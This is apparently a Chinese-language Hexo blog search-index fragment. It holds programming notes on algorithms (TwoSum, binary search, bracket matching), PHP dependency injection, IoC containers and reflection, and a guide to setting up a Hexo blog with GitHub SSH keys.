4 ];current() 输出数组中的当前元素的值end() - 将内部指针指向数组中的最后一个元素，并输出next() - 将内部指针指向数组中的下一个元素，并输出prev() - 将内部指针指向数组中的上一个元素，并输出reset() - 将内部指针指向数组中的第一个元素，并输出each() - 返回当前元素的键名和键值，并将内部指针向前移动 https://learnku.com/articles/33253 TwoSum1234567891011121314151617181920212223242526272829func TwoSum1(nums []int, target int) []int &#123; len := len(nums) for i := 0; i &lt; len; i++ &#123; for j := i + 1; j &lt; len; j++ &#123; if target == nums[i]+nums[j] &#123; return []int&#123;i, j&#125; &#125; &#125; &#125; return nil&#125;a + b = target 转换成 b = target - a，将值与下标的关系存入map中func TwoSum2(nums []int, target int) []int &#123; aMap := make(map[int]int, len(nums)) //循环nums 获取 key and value for k, v := range nums &#123; aMap[v] = k if j, ok := aMap[target-v]; ok &#123; //从值与键的映射中查询 成功查询说明 j 之前 有值 满足条件 注意：此时 j&lt;k 先建映射再进行查询 return []int&#123;j, k&#125; &#125; &#125; return nil&#125;https://dalebao.github.io/2019/04/13/LeetCode-001-TwoSum/ 二分查找123456789101112131415161718192021222324252627282930313233343536373839function binarySerach($data, $res)&#123; $left = 0; $right = count($data) - 1; while ($left &lt;= $right) &#123; $middle = $left + (($right - $left) &gt;&gt; 1); if ($data[$middle] == $res) return $middle; else if ($data[$middle] &gt; $res) $right = $middle - 1; else $left = $middle + 1; &#125; return -1; &#125; 题目让我们找出重复的数，给定的数组的值都在 1-n 之间，数组总数是 n+1, 那么必然有数字是重复的，让我们来找出这个重复的数。 这道题可以有更好的解法 (我这里强行把它当做二分的场景)，二分的解题思路就是取 n 的中位数，遍历数组，统计不大于中位数的个数，如果不大于中位数的个数比中位数还大，说明重复的数在中位数的左边 (注意包括中位数自己，理解一下这一句)，否则的话重复的数肯定出现在中位数的右边，而且肯定不包括中位数。好了下面看代码再细讲。 /** * @param Integer[] $nums * @return Integer */ function findDuplicate($nums) &#123; $left = 1; $right = count($nums) - 1; while ($left &lt; $right) &#123; // &lt; $middle = ($left + $right) &gt;&gt; 1; $sum = 0; for ($j = 0; $j &lt; count($nums); $j++) &#123; if ($nums[$j] &lt;= $middle) &#123; $sum++; &#125; &#125; if ($sum &lt;= $middle) &#123; //排除掉中位数 $left = $middle + 1; &#125; else &#123; //不能排除中位数 $right = $middle; &#125; &#125; //相返回left还是right都可以 因为必然存在left==right return $left; &#125; 二分查找法123456789101112131415161718192021222324252627所谓二分查找，针对的是一个有序的数据集合（这点很重要），查找思想有点类似分治思想。每次都通过跟区间的中间元素对比，将待查找的区间缩小为之前的一半，直到找到要查找的元素，或者区间被缩小为 0。注意到二分查找针对的必须是已经排序过的有序数组，否则不能使用该算法。function binary_search($nums, $num) &#123; return binary_search_internal($nums, $num, 0, count($nums) - 1); &#125; function binary_search_internal($nums, $num, $low, $high) &#123; if ($low &gt; $high) &#123; return -1; &#125; $mid = floor(($low + $high) / 2); if ($num &gt; $nums[$mid]) &#123; return binary_search_internal($nums, $num, $mid + 1, $high); &#125; elseif ($num &lt; $nums[$mid]) &#123; return binary_search_internal($nums, $num, $low, $mid - 1); &#125; else &#123; return $mid; &#125; &#125; $nums = [1, 2, 3, 4, 5, 6]; $index = binary_search($nums, 5); print $index; https://learnku.com/articles/37822 使用二分查找需要注意一个前提，那就是针对有序数组，换言之，二分查找适用于变动不是很频繁的静态序列集，如果序列集变动很频繁，经常进行插入删除操作，那么就要不断维护这个序列集的排序，这个成本也很高，因此，这种情况下就不适用二分查找了，比如我们的数据库查询，增删改查很频繁，显然不是通过二分查找来进行查询的。 对称括号123456789function isValid($s) &#123; $s = str_replace(['()', '[]', '&#123;&#125;'], '', $s, $count); if($count == 0)&#123; return strlen($s)==0; &#125;else&#123; return $this-&gt;isValid($s); &#125; &#125; https://www.debuginn.cn/5081.html https://github.com/debuginn/Learning-Code-Algorithm 无限级菜单12345678910111213141516171819202122232425262728293031323334353637383940CREATE TABLE `SuperUserMenus` ( `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'ID', `pid` int(11) NOT NULL COMMENT '父级ID', `order` int(11) NOT NULL DEFAULT '0' COMMENT '菜单排序', `title` varchar(100) NOT NULL COMMENT '菜单标题', `controller` varchar(100) DEFAULT NULL COMMENT '控制器名称', `method` varchar(100) DEFAULT NULL COMMENT '方法名称', `ishidden` int(1) NOT NULL DEFAULT '0' COMMENT '是否隐藏：0正常显示，1隐藏', `status` int(1) NOT NULL DEFAULT '0' COMMENT '状态：0正常，1禁用', PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;public function index()&#123; $Super_id = 1; $menus = false; $role = Db::table('SuperUser')-&gt;where('Super_id', $Super_id)-&gt;select(); $role = $role[0]; if ($role) &#123; $role['rights'] = (isset($role['rights']) &amp;&amp; $role['rights']) ? json_decode($role['rights'], true) : []; &#125; if ($role['rights']) &#123; $menus = Db::query('select * from SuperUserMenus where id in(' . implode(',', $role['rights']) . ') and ishidden=0 and status=0'); $menus = $this-&gt;_array_column($menus, null, 'id'); $menus &amp;&amp; $menus = $this-&gt;gettreeitems($menus); &#125; return json_encode($menus);&#125;private function gettreeitems($items) &#123; $tree = array(); foreach ($items as $item) &#123; if (isset($items[$item['pid']])) &#123; $items[$item['pid']]['children'][] = &amp;$items[$item['id']]; &#125; else &#123; $tree[] = &amp;$items[$item['id']]; &#125; &#125; return $tree; &#125; https://www.debuginn.cn/4549.html LeetCode_PHP 二叉树的遍历 两数之和 PHP 排序算法之选择排序 算法图解3 - 递归，快排 LeetCode-Algorithms 算法题 PHP 实现 尝试 leetcode 题目 PHP生成随机红包算法 什么是B-树 数据结构的基本概念 JavaScript排序算法及性能比较 十大经典排序算法 Leetcode 数据库题目 后端架构师技术图谱 算法之排序 二叉树的遍历算法 TCP/IP 协议低层驱动原理 leetcode题解 LeetCode 的题目印成一本书使用这个小工具： 数据结构入门 数据结构与算法分析]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP依赖注入]]></title>
    <url>%2F2018%2F11%2F23%2FPHP%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[本文转自laravel-china 依赖注入1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?phpclass Car&#123; //汽车可以跑,定义一个方法 run() public function run()&#123; return '滴滴滴,车开了'; &#125;&#125;class Person&#123; private $car = null;//保存某人的车,暂时还没车 public function drive()&#123; $this-&gt;car = new Car();//要开车先造车,造了一辆车保存在某人的 $car 里 return $this-&gt;car-&gt;run();//调用车的 run() 方法 &#125;&#125;$xiaoming = new Person();echo $xiaoming-&gt;drive();//输出 滴滴滴,车开了class Car&#123; //汽车可以跑,定义一个方法 run() public function run() &#123; return '滴滴滴,车开了'; &#125;&#125;class Person&#123; private $car = null;//保存某人的车,暂时还没车 //new 某人的时候,就给他注入一辆车,通过 $a 传入构造方法,并保存在 $car 里 public function __construct($a) &#123; $this-&gt;car = $a; &#125; public function drive() &#123; return $this-&gt;car-&gt;run();//调用车的 run() 方法 &#125;&#125;$car = new Car();//买一辆车$xiaoming = new Person($car);//new 小明的时候,把刚才买的车注入echo $xiaoming-&gt;drive();//输出 滴滴滴,车开了class Car&#123; //汽车可以跑,定义一个方法 run() public function run() &#123; return '滴滴滴,车开了'; &#125;&#125;class Person&#123; private $car = null;//保存某人的车,暂时还没车 //new 某人的时候,就给他注入一辆车,通过 $a 传入构造方法 public function __construct(Car $a)// &lt;----这里做了类型限定 &#123; $this-&gt;car = $a; &#125; public function drive() &#123; return $this-&gt;car-&gt;run();//调用车的 run() 方法 &#125;&#125; IoC 容器类1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465//写一个简单的 IoC 容器类class Container&#123; private static $objArr = [];//定义一个静态的空数组 public static function set($flag, Callable $func)&#123; self::$objArr[$flag] = $func;//存入键值对,键是一个字符串,作为标识符,值是一个匿名函数 &#125; public static function get($flag)&#123; $tmp = self::$objArr[$flag];//取出标识符对应的匿名函数,用$tmp临时保存一下 return $tmp();//在$tmp后名加上括号,表示执行这个函数,并返回 &#125;&#125;//下面这条语句执行完毕后,会在 $objArr 里存入一个键值对,键是 car ,值是这个匿名函数,该匿名函数返回的是创建 Car 对象的语句Container::set('Car', function()&#123; return new Car();&#125;);//下面这条语句执行完毕后,会在 $objArr 里存入一个键值对,键是 person ,值是这个匿名函数,该匿名函数返回的是创建 Person 对象的语句Container::set('Person', function()&#123; return new Person(Container::get('Car'));//直接去容器中取一辆车出来,并作为参数传给 Person 类的构造函数&#125;);$xiaomin = Container::get('Person');//直接去容器中取一个人出来,取名叫小明echo $xiaomin-&gt;drive();//输出 滴滴滴,车开了class Container&#123; protected $binds; protected $instances; public function bind($abstract, $concrete) &#123; if ($concrete instanceof Closure) &#123; $this-&gt;binds[$abstract] = $concrete; &#125; else &#123; $this-&gt;instances[$abstract] = $concrete; &#125; &#125; public function make($abstract, $parameters = []) &#123; if (isset($this-&gt;instances[$abstract])) &#123; return $this-&gt;instances[$abstract]; &#125; array_unshift($parameters, $this); return call_user_func_array($this-&gt;binds[$abstract], $parameters); &#125;&#125;//在线执行laravel https://implode.io/4mT8O4 $container = new Container; $container-&gt;bind('Board', function($container)&#123; return new CommonBoard; &#125;); $container-&gt;bind('Computer',function($container,$module)&#123; return new Computer($container-&gt;make($module)); &#125;); $computer = $container-&gt;make('Computer',['Board']); 魔术方法1234567891011121314151617181920212223242526272829//https://laravel-china.org/articles/20625class Model&#123; protected function increment($column, $amount = 1, array $extra = []) &#123; return $this-&gt;incrementOrDecrement($column, $amount, $extra, 'increment'); &#125; public function __call($method, $parameters) &#123; if (in_array($method, ['increment', 'decrement'])) &#123; return $this-&gt;$method(...$parameters); &#125; return $this-&gt;forwardCallTo($this-&gt;newQuery(), $method, $parameters); &#125; public static function __callStatic($method, $parameters) &#123; return (new static)-&gt;$method(...$parameters); &#125;&#125;(new User)-&gt;increment('age');User::increment('age');第一种，因为我们User继承了Model类，但是increment方法前有个protected导致我们无法从外部访问这个方法。但是不用慌张，这个时候__call魔术方法就起到了效果，他会帮我们去访问increment方法。第二种，我们用静态调用increment方法，运行的时候，程序就去找有没有定义的静态increment方法，找了一圈没有找到，怎么办？这个时候__callStatic开始发挥作用。我们用的是User类，因为延迟静态绑定的缘故，可以看成:return (new User)-&gt;increment('age'); 控制反转123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156class Boos&#123; //领导依赖员工 private $staff; //现在老板只需要接受 hr 招聘就好，将控制权交给 hr //以设置方法来实现依赖注入 public function setStaff(Standard $staff)&#123; $this-&gt;staff = $staff; &#125; public function task()&#123; $this-&gt;staff-&gt;work(); &#125;&#125;//招聘所设定的标准interface Standard&#123; public function work();&#125;//员工需要依赖的标准class StaffA implements Standard&#123; public function work()&#123; echo '雇员A有能力能够完成老板指定的工作'; &#125;&#125;class StaffB implements Standard&#123; public function work()&#123; echo '雇员B有能力能够完成老板指定的工作'; &#125;&#125;//ioc容器class Hr&#123; public function getStagff()&#123; return new StaffB(); &#125;&#125;//公司老板$boos = new Boos();//老板招的hr$hr = new Hr();$staff = $hr-&gt;getStagff();//hr把招到的人给老板（控制反转和依赖注入）$boos-&gt;setStaff($staff);//老板让他工作了$boos-&gt;task();class Boos&#123; //领导依赖员工 private $staff; //老板只需要告诉外部我需要什么样的人就好了，其它什么都不管，具体什么样的人交给外部处理。 //用构造方法方式实现依赖注入 public function __construct(Standard $staff)&#123; $this-&gt;staff = $staff; &#125; public function task()&#123; $this-&gt;staff-&gt;work(); &#125;&#125;//招聘所设定的标准interface Standard&#123; public function work();&#125;//员工需要依赖的标准class StaffA implements Standard&#123; public function work()&#123; echo '雇员A有能力能够完成老板指定的工作'; &#125;&#125;class StaffB implements Standard&#123; public function work()&#123; echo '雇员B有能力能够完成老板指定的工作'; &#125;&#125;class Hr&#123; private $binds = []; //接受不同员工的简历，并存起来 public function bind($contract,$concrete)&#123; $this-&gt;binds[$contract] = $concrete; &#125; //询问老板选人的标准由哪些,并且从满足的简历中筛选人 private function methodBindParams($className)&#123; $reflect = new reflect($className,'__construct'); return $reflect-&gt;bindParamsToMethod(); &#125; //将选好的工作人员交给老板 public function make($className)&#123; $methodBindParams = $this-&gt;methodBindParams($className); $reflect = new reflect($className,'__construct'); return $reflect-&gt;make($this-&gt;binds,$methodBindParams); &#125;&#125;class reflect&#123; private $className; private $methodName; public function __construct($className,$methodName)&#123; $this-&gt;className = $className; $this-&gt;methodName = $methodName; &#125; //绑定参数到方法 public function bindParamsToMethod()&#123; $params = []; $method = new ReflectionMethod($this-&gt;className,$this-&gt;methodName); foreach ($method-&gt;getParameters() as $param) &#123; $params[] = [$param-&gt;name,$param-&gt;getClass()-&gt;name]; &#125; return [$this-&gt;className=&gt; $params]; &#125; public function make($bind,$methodBindParams)&#123; $args = []; foreach ($methodBindParams as $className =&gt; $params) &#123; foreach ($params as $param) &#123; list($paramName,$paramType) = $param; $paramName = new $bind[$paramType](); array_push($args, $paramName); &#125; &#125; $reflectionClass = new ReflectionClass($this-&gt;className); return $reflectionClass-&gt;newInstanceArgs($args); &#125;&#125;$hr = new Hr();//老板如果需要换工作人员，只需要绑定其它的工作人员即可。$staff = $hr-&gt;bind('Standard','StaffA');$boos = $hr-&gt;make('Boos');$boos-&gt;task(); 依赖注入原理1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phpnamespace Database;use ReflectionMethod;class Database&#123; protected $adapter; public function __construct () &#123;&#125; public function test (MysqlAdapter $adapter) &#123; $adapter-&gt;test(); &#125;&#125;class MysqlAdapter&#123; public function test () &#123; echo "i am MysqlAdapter test"; &#125;&#125;class app&#123; public static function run ($instance, $method) &#123; if (! method_exists($instance, $method)) return null; $reflector = new ReflectionMethod($instance, $method); $parameters = [ 1 ]; foreach ($reflector-&gt;getParameters() as $key =&gt; $parameter) &#123; $class = $parameter-&gt;getClass(); if ($class) &#123; array_splice($parameters, $key, 0, [ new $class-&gt;name() ]); &#125; &#125; call_user_func_array([ $instance, $method ], $parameters); &#125;&#125;app::run(new Database(), 'test'); 反射机制实现依赖注入123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126&lt;?phpnamespace Models;class Car&#123;&#125;namespace Framework;class App&#123; public function getInstance($className) &#123; //实例化 ReflectionClass 对象 $reflector = new \ReflectionClass($className); if (!$reflector-&gt;isInstantiable()) &#123; //不能被实例化的逻辑 return false; &#125; //获取构造器 $constructor = $reflector-&gt;getConstructor(); //如果没有构造器，直接实例化 if (!$constructor) &#123; //这里用了变量来动态的实例化类 return new $className; &#125; &#125;&#125;$app = new App();$car = $app-&gt;getInstance('Models\Car');var_dump($car); //输出 object(Models\Car)#4 (0) &#123; &#125;&lt;?phpnamespace Framework;//定义一个类，用于实现依赖注入class App&#123; public function getInstance($className) &#123; //实例化 ReflectionClass 对象 $reflector = new \ReflectionClass($className); if (!$reflector-&gt;isInstantiable()) &#123; //不能被实例化的逻辑，抽象类和接口不能被实例化 return false; &#125; //获取构造器 $constructor = $reflector-&gt;getConstructor(); //如果没有构造器，也就是没有依赖，直接实例化 if (!$constructor) &#123; return new $className; &#125; //如果有构造器，先把构造器中的参数获取出来 $parameters = $constructor-&gt;getParameters(); //再遍历 parameters ，找出每一个类的依赖，存到 dependencies 数组中 $dependencies = array_map(function ($parameter) &#123; /** * 这里是递归的去寻找每一个类的依赖，例如第一次执行的时候，程序发现汽车 Car 类依赖底盘 Chassis * 类，此时 $parameter 是一个ReflectionParameter 的实例，接着调用 ReflectionParameter * 的 getClass() 方法，获得一个 ReflectionClass 的实例，再接着调用 ReflectionClass * 的 getName() 方法，取得类名，也就是 Models\Chassis ，但此时此刻还不能直接去 new * Models\Chassis ，因为 Models\Chassis 也有依赖，故要递归的去调用 getInstance * 进一步去寻找该类的依赖，周而复始，直到触发上面的 if(!$constructor) ，停止递归。 */ return $this-&gt;getInstance($parameter-&gt;getClass()-&gt;getName()); &#125;, $parameters); //最后，使用 ReflectionClass 类提供的 newInstanceArgs ，方法去实例化类，参数将会传入构造器中 return $reflector-&gt;newInstanceArgs($dependencies); &#125;&#125;namespace Models;class Car&#123; protected $chassis; //汽车依赖底盘 public function __construct(Chassis $chassis) &#123; $this-&gt;chassis = $chassis; &#125;&#125;class Chassis&#123; protected $tyre; protected $axle; //底盘依赖轮胎和轴承 public function __construct(Tyre $tyre, Axle $axle) &#123; $this-&gt;tyre = $tyre; $this-&gt;axle = $axle; &#125;&#125;class Tyre&#123; protected $axle; //轮胎也依赖轴承 public function __construct(Axle $axle) &#123; $this-&gt;axle = $axle; &#125;&#125;class Axle&#123; //轴承无依赖&#125;$app = new \Framework\App();$car = $app-&gt;getInstance('Models\Car');//不用$car = new Car(new Chassis(new Tyre(new Axle), new Axle()))var_dump($car); IOC123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;?php/** * 没有IoC/DI的时候，常规的A类使用C类的示例 *//** * Class c */class c&#123; public function say() &#123; echo 'hello'; &#125;&#125;/** * Class a */class a&#123; private $c; public function __construct() &#123; $this-&gt;c = new C(); // 实例化创建C类 &#125; public function sayC() &#123; echo $this-&gt;c-&gt;say(); // 调用C类中的方法 &#125;&#125;$a = new a();$a-&gt;sayC();&lt;?php/** * 当有了IoC/DI的容器后,a类依赖c实例注入的示例https://segmentfault.com/a/1190000007536704 *//** * Class c */class c&#123; public function say() &#123; echo 'hello'; &#125;&#125;/** * Class a */class a&#123; private $c; public function setC(C $c) &#123; $this-&gt;c = $c; // 实例化创建C类 &#125; public function sayC() &#123; echo $this-&gt;c-&gt;say(); // 调用C类中的方法 &#125;&#125;$c = new C();$a = new a();$a-&gt;setC($c);$a-&gt;sayC(); 依赖注入 控制反转123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154interface DbConnect &#123; public function connect();&#125;class DbA implements DbConnect &#123; public function connect() &#123; // TODO: Implement test_echo() method. echo 'A'; &#125;&#125;class DbB implements DbConnect &#123; public function connect() &#123; // TODO: Implement test_echo() method. echo "B"; &#125;&#125;class ConnectDb &#123; protected $connects; public function __construct() &#123; $this-&gt;connect = new DbA(); &#125; public function connect() &#123; echo $this-&gt;connect-&gt;connect(); &#125;&#125;上面写法可以实现数据库连接功能，但是要切换到 B 数据库就要修改 ConnectDb 类，这样代码没法达到低耦合，也不符合编程开放封闭原则。我们可以把连接的类用函数传参的方式传进 ConnectDb 构造函数里.class ConnectDb &#123; protected $connects; public function __construct(DbConnect $dbConnect) &#123; $this-&gt;connect = $dbConnect; &#125; public function connect() &#123; echo $this-&gt;connect-&gt;connect(); &#125;&#125;$ConnectDb = new ConnectDb(new DbA());$ConnectDb-&gt;connect();这样我们就可以不修改 ConnectDb 而是用构造函数参数传递的方式切换数据库，这就是控制反转（感觉好像工厂模式。。。），不需要自己内容修改，通过外部传递参数，这种由外部负责其依赖需求的行为，称控制反转（IoC）不通过自己内部 new 对象或者实例，而是通过函数或者构造函数传递进来。称为依赖注入（DI）反射刚毕业那会面试一家公司面试就问我了不了解反射，当时给我问的一懵。工作这么长时间了其实还是不了解。。。。反射其实就是根据类名返回这个类的任何信息，比如该类的方法，参数，属性等等ReflectionClass 类报告了一个类的有关信息。// — 初始化 ReflectionClass 类$reflectionClass = new ReflectionClass('ConnectDb');// — 获取类的构造函数 一个 ReflectionMethod 对象，反射了类的构造函数，或者当类不存在构造函数时返回 NULL。$constructor = $reflectionClass-&gt;getConstructor();// - 获取构造函数所有依赖参数$dependencies = $constructor-&gt;getParameters();// - 创建类的新的实例。给出的参数将会传递到类的构造函数。$ConnectDb = $reflectionClass-&gt;newInstance();// - 创建一个类的新实例，给出的参数将传递到类的构造函数。这个参数以 array 形式传递到类的构造函数 返回值 返回类的实例$ConnectDb = $reflectionClass-&gt;newInstanceArgs($dependencies);我们可以创建一个方法，利用反射的机制拿到 ConnectDb 类的构造函数，然后拿到构造函数的参数对象，用递归的方法创建参数依赖，最后调用 newInstanceArgs 方法生成 ConnectDb 实例interface DbConnect &#123; public function connect();&#125;class DbA implements DbConnect &#123; public function connect() &#123; // TODO: Implement test_echo() method. echo 'A'; &#125;&#125;class DbB implements DbConnect &#123; public function connect() &#123; // TODO: Implement test_echo() method. echo "B"; &#125;&#125;class ConnectDb &#123; protected $connects; //反射是不能动态创建接口的 public function __construct(DbA $dbConnect) &#123; $this-&gt;connect = $dbConnect; &#125; public function connect() &#123; echo $this-&gt;connect-&gt;connect(); &#125;&#125;function make ($concrete) &#123; // — 初始化 ReflectionClass 类 $reflectionClass = new ReflectionClass($concrete); // — 获取类的构造函数 一个 ReflectionMethod 对象，反射了类的构造函数，或者当类不存在构造函数时返回 NULL。 $constructor = $reflectionClass-&gt;getConstructor(); //如果不需要传递参数直接返回实例 if (is_null($constructor)) &#123; return $reflectionClass-&gt;newInstance(); &#125; else &#123; // - 获取构造函数所有依赖参数 $dependencies = $constructor-&gt;getParameters(); $instance = getdependencies($dependencies); return $reflectionClass-&gt;newInstanceArgs($instance); &#125;&#125;function getdependencies($parameter)&#123; $dependencies = []; foreach ($parameter as $paramete) &#123; //返回对象实例 object 所属类的名字。返回对象实例 object 所属类的名字。 如果 object 不是一个对象则返回 FALSE。 $dependencies[] = make($paramete-&gt;getClass()-&gt;name); &#125; return $dependencies;&#125;$ConnectDb = make('ConnectDb');$ConnectDb-&gt;connect();总结：控制反转（IoC）：不修改类内部自身，通过外部参数传递的方式，由外部负责其依赖需求的行为。依赖注入（DI） ：不通过自己 new 或实例实例化，通过函数或者构造函数传递进来。反射：根据类名获取类的信息，方法、属性、参数等等https://learnku.com/articles/32310 IOC demo1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980interface Board &#123; public function type(); &#125; class CommonBoard implements Board &#123; public function type()&#123; echo '普通键盘'; &#125; &#125; class MechanicalKeyboard implements Board &#123; public function type()&#123; echo '机械键盘'; &#125; &#125; class Computer &#123; protected $keyboard; public function __construct (Board $keyboard) &#123; $this-&gt;keyboard = $keyboard; &#125; public function type()&#123; $this-&gt;keyboard-&gt;type(); &#125; &#125; $computer = new Computer(new MechanicalKeyboard());class Container&#123; protected $binds; protected $instances; public function bind($abstract, $concrete) &#123; if ($concrete instanceof Closure) &#123; $this-&gt;binds[$abstract] = $concrete; &#125; else &#123; $this-&gt;instances[$abstract] = $concrete; &#125; &#125; public function make($abstract, $parameters = []) &#123; if (isset($this-&gt;instances[$abstract])) &#123; return $this-&gt;instances[$abstract]; &#125; array_unshift($parameters, $this);//闭包的时候第一个参数为$this return call_user_func_array($this-&gt;binds[$abstract], $parameters); &#125;&#125; $container = new Container; $container-&gt;bind('Board', function($container)&#123; return new CommonBoard; &#125;); //当我需要Computer类的时候你就给我实例化Computer类 $container-&gt;bind('Computer',function($container,$module)&#123; return new Computer($container-&gt;make($module)); &#125;); $computer = $container-&gt;make('Computer',['Board']);//对Computer进行生产返回一个实例。 echo $computer-&gt;type(); //更换键盘怎么办呢？ $container-&gt;bind('Board', function($container)&#123; return new MechanicalKeyboard; &#125;); $container-&gt;bind('Computer',function($container,$module)&#123; return new Computer($container-&gt;make($module)); &#125;); $computer = $container-&gt;make('Computer',['Board']); //https://3v4l.org/3krab 反射机制实现依赖注入 PHP中的依赖注入（DI）容器 Laravel 服务容器，IoC,DI Laravel 依赖注入原理 浅析依赖倒转、控制反转、IoC 容器、依赖注入]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo搭建博客]]></title>
    <url>%2F2018%2F11%2F20%2Fhello-world%2F</url>
    <content type="text"><![CDATA[通常我们可以使用github pages 来搭建静态博客，建立一个username.github.io的项目就可以了，如果要将其他项目也作为页面展示，可以将代码推送到gh-pages分支。 GitHub pages木有默认样式，所以如果你不会自己写css，博客很难看的，所以有了hexo. 准备先安装好git node hexo 初始化123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101$ hexo init blogINFO Cloning hexo-starter to D:\code\hexo\blogCloning into 'D:\code\hexo\blog'...remote: Enumerating objects: 68, done.remote: Total 68 (delta 0), reused 0 (delta 0), pack-reused 68Unpacking objects: 100% (68/68), done.Submodule 'themes/landscape' (https://github.com/hexojs/hexo-theme-landscape.git) registered for path 'themes/landscape'Cloning into 'D:/code/hexo/blog/themes/landscape'...remote: Enumerating objects: 5, done.remote: Counting objects: 100% (5/5), done.remote: Compressing objects: 100% (5/5), done.remote: Total 846 (delta 0), reused 1 (delta 0), pack-reused 841Receiving objects: 100% (846/846), 2.55 MiB | 16.00 KiB/s, done.Resolving deltas: 100% (445/445), done.Submodule path 'themes/landscape': checked out '73a23c51f8487cfcd7c6deec96ccc7543960d350'INFO Install dependenciesyarn install v1.9.4info No lockfile found.[1/4] Resolving packages...warning hexo &gt; titlecase@1.1.2: no longer maintainedwarning hexo &gt; nunjucks &gt; postinstall-build@5.0.3: postinstall-build's behavior is now built into npm! You should migrate off of postinstall-build and use the new `prepare` lifecycle script with npm 5.0.0 or greater.[2/4] Fetching packages...info fsevents@1.2.4: The platform "win32" is incompatible with this module.info "fsevents@1.2.4" is an optional dependency and failed compatibility check. Excluding it from installation.[3/4] Linking dependencies...[4/4] Building fresh packages...success Saved lockfile.Done in 18.06s.INFO Start blogging with Hexo!$ cd bloghexo的目录结构.├── .deploy #需要部署的文件├── node_modules #Hexo插件├── public #生成的静态网页文件├── scaffolds #模板├── source #博客正文和其他源文件, 404 favicon CNAME 等都应该放在这里| ├── _drafts #草稿| └── _posts #文章├── themes #主题├── _config.yml #全局配置文件└── package.json$ npm installnpm WARN deprecated titlecase@1.1.2: no longer maintainednpm WARN deprecated postinstall-build@5.0.3: postinstall-build's behavior is now built into npm! You should migrate off of postinstall-build and use the new `prepare` lifecycle script with npm 5.0.0 or greater.&gt; nunjucks@3.1.4 postinstall D:\code\hexo\blog\node_modules\nunjucks&gt; node postinstall-build.js srcnpm WARN rollback Rolling back node-pre-gyp@0.10.0 failed (this is probably harmless): EPERM: operation not permitted, rmdir 'D:\code\hexo\blog\node_modules\fsevents\node_modules'npm notice created a lockfile as package-lock.json. You should commit this file.npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@1.2.4 (node_modules\fsevents):npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.2.4: wanted &#123;"os":"darwin","arch":"any"&#125; (current: &#123;"os":"win32","arch":"x64"&#125;)added 101 packages, removed 40 packages and updated 321 packages in 23.882s$ ls_config.yml package.json scaffolds/ themes/node_modules/ package-lock.json source/ yarn.lock$ hexo gINFO Start processingINFO Files loaded in 655 msINFO Generated: index.htmlINFO Generated: archives/index.htmlINFO Generated: fancybox/jquery.fancybox.cssINFO Generated: fancybox/blank.gifINFO Generated: fancybox/fancybox_loading@2x.gifINFO Generated: fancybox/fancybox_sprite@2x.pngINFO Generated: fancybox/jquery.fancybox.jsINFO Generated: fancybox/jquery.fancybox.pack.jsINFO Generated: fancybox/fancybox_sprite.pngINFO Generated: fancybox/fancybox_overlay.pngINFO Generated: archives/2018/11/index.htmlINFO Generated: fancybox/fancybox_loading.gifINFO Generated: css/fonts/FontAwesome.otfINFO Generated: fancybox/helpers/jquery.fancybox-thumbs.cssINFO Generated: js/script.jsINFO Generated: fancybox/helpers/jquery.fancybox-buttons.jsINFO Generated: fancybox/helpers/jquery.fancybox-media.jsINFO Generated: fancybox/helpers/jquery.fancybox-buttons.cssINFO Generated: css/fonts/fontawesome-webfont.eotINFO Generated: css/fonts/fontawesome-webfont.woffINFO Generated: fancybox/helpers/fancybox_buttons.pngINFO Generated: fancybox/helpers/jquery.fancybox-thumbs.jsINFO Generated: css/style.cssINFO Generated: css/fonts/fontawesome-webfont.ttfINFO Generated: archives/2018/index.htmlINFO Generated: css/images/banner.jpgINFO Generated: css/fonts/fontawesome-webfont.svgINFO Generated: 2018/11/20/hello-world/index.htmlINFO 28 files generated in 1.26 s$ hexo sINFO Start processingINFO Hexo is running at http://localhost:4000 . Press Ctrl+C to stop$ hexo dERROR Deployer not found: git GitHub key 配置1234567891011121314151617181920212223242526271.生成指定名字的密钥 ssh-keygen -t rsa -C “xx@sina.com” -f ~/.ssh/github_sushengbuhuo 会生成 github_sushengbuhuo 和 github_sushengbuhuo.pub 这两个文件2.密钥复制到托管平台上 vim ~/.ssh/github_sushengbuhuo.pub ，把内容复制至代码托管平台上3.修改config文件 vim ~/.ssh/config #修改config文件，如果没有创建 configHost sushengbuhuo.github.comHostName github.comUser gitIdentityFile ~/.ssh/github_sushengbuhuoHost github.comHostName github.comUser gitIdentityFile ~/.ssh/github4.测试验证$ ssh -T git@github.com:ssh: Could not resolve hostname github.com:: Name or service not known$ ssh -T git@github.comgit@github.com: Permission denied (publickey).$ ssh -T git@sushengbuhuo.github.comHi sushengbuhuo! You've successfully authenticated, but GitHub does not provide shell access. 配置config.yml123456deploy: type: git repository: git@sushengbuhuo.github.com:sushengbuhuo/sushengbuhuo.github.io.git branch: master theme: next 推送到GitHubhexo clean &amp;&amp; hexo gINFO Deleted database.INFO Deleted public folder.INFO Start processingINFO Files loaded in 545 msINFO 